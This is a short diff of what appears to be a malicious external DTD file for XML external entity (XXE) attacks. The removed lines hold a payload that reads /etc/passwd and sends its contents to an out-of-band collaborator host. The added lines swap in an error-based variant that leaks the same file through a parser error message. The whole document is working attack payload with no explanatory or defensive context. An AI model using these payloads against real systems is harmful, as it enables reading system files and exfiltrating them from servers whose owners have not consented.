@@ -1,4 +1,4 @@
-<!ENTITY % a SYSTEM "file:///etc/passwd">
-<!ENTITY % b "<!ENTITY &#x25 c SYSTEM 'http://kma6ziomnoo9ahmjcnvx54h10s6ju9iy.oastify.com/?data=%a;'>">
-%b;
-%c;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
